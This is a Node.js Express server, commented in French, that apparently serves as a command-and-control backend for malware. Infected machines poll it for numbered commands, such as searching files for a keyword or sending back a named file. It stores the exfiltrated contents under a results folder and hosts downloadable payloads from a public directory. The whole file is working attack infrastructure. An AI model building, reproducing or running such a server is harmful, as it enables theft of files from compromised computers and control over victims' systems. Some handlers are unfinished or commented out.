const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const https = require("https");
const fs = require('fs');
const date = require('date-and-time');
const multer = require("multer")



var storage = multer.diskStorage({
    destination: function (req, file, callback) {
        callback(null, './results/3');
    },
    filename: function (req, file, callback) {
        callback(null, file.originalname+"_"+date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss'));
    }
});

const uploads = multer({storage: storage}, )

//https config
var key = fs.readFileSync('./certs/nopass.key');
var cert = fs.readFileSync('./certs/cert.pem');
var options = {
  key: key,
  cert: cert
};


// use : Utilisation des Middlewares Express
/*app.use( bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true })); // Parse les requêtes avec content-type: application/x-www-form-urlencoded
*/

// publlic routes (payloads to download will be located here)
app.use(express.static('public'))

// gestion interface graphique
app.get('/command', (req, res) => {
    console.log("command working")
    let command_number = 0;

    // get command number
    fs.readFile('command_to_execute.txt', 'utf8' , (err, data) => {
        if (err) {
          console.error(err)
          return
        }
        command_number = parseInt(data);
        console.log(command_number);

        // Commande 2 : on cherche les fichiers avec le keyword
        if(command_number == 2){
            fs.readFile('args/command2_arg.txt', 'utf8' , (err, data) => {
                if (err) {
                    console.error(err)
                    return
                }
                let command2_arg = data.replace(/[\n\r]/g, '');
                res.send("command="+command_number+"&keyword="+command2_arg+'\n');
            })
        }
        // Commande 3 : on passe un nom de fichier pour que la machine infectée nous renvoie son contenu
        else if(command_number == 3){
            fs.readFile('args/command3_arg.txt', 'utf8' , (err, data) => {
                if (err) {
                    console.error(err)
                    return
                }
                console.log(data);
                let command3_arg = data.replace(/[\n\r]/g, '');
                console.log(command3_arg);
                res.send("command="+command_number+"&filename="+command3_arg+'\n');
            })
            
        }
        // Commande 1, 4 et 5
        else{
            res.send("command="+command_number+'\n');
        }
    })
})

app.post("/command/2", uploads.none(), (req, res) => {
    let json_string = JSON.parse(req.body.json)
    console.log(json_string)
    let json = JSON.parse(json_string)
    fs.writeFile('results/'+2+'/'+date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss_')+ json.keyword+'.txt', JSON.stringify(json.content), err => {
        if (err) {
            console.error(err);
            res.send("error write file\n");
            return
        }
        //file written successfully
        res.send("ok\n");
    })

})

app.post("/command/3", uploads.single("fichier"), (req, res) => {
    console.log(req.body)
    //let json_string = JSON.parse(req.body.json)
    //console.log(json_string)
    //let json = JSON.parse(json_string)

})





//Post for a single command
app.post('/command/:id_task', uploads.none(), (req, res) => {
  if(req.params.id_task == 4 || req.params.id_task == 1){
    //console.log("On va poster le résultat pour la commande "+req.params.id_task);
    let content = JSON.parse(JSON.parse(req.body.json));
    content = JSON.stringify(content);
    console.log(content);
    //console.log(date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss_'));
    fs.writeFile('results/'+req.params.id_task+'/'+date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss')+'.txt', content, err => {
      if (err) {
        console.error(err)
        res.send("error write file\n");
        return
      }
      //file written successfully
      res.send("ok\n");
    })
  }
  else if(req.params.id_task == 2){
    console.log('keyword : '+req.body.keyword);
    console.log('content : '+req.body.content);
    let content = req.body.content;
    let keyword = req.body.keyword;
    fs.writeFile('results/'+req.params.id_task+'/'+date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss_')+keyword+'.txt', content, err => {
      if (err) {
        console.error(err);
        res.send("error write file\n");
        return
      }
      //file written successfully
      res.send("ok\n");
    })
  }
  else if(req.params.id_task == 3){
    //console.log('filename : '+req.body.filename);
    //console.log('content : '+req.body.content);
    /*let content = req.body.content;
    let filename = req.body.filename;
    let content_buffer = Buffer.from(content, 'base64');
    content = content_buffer.toString('utf-8');
    console.log(content);
    let filename_parts = filename.split("\\")
    filename_parts.reverse()

    fs.writeFile('results/'+req.params.id_task+'/'+date.format(new Date(), 'YYYY-MM-DD_HH-mm-ss_')+filename_parts[0]+'.txt', content, err => {
      if (err) {
        console.error(err);
        res.send("error write file\n");
        return
      }
      //file written successfully
      res.send("ok\n");
    })*/
  }
  
})



// http sur port 3000 et https sur port 443
app.listen(3000, () => {
  console.log("Server is running on port 3000.");
});

let serv = https.createServer(options, app);
serv.listen(443, () => {
  console.log("Server is running on port 443.")
})
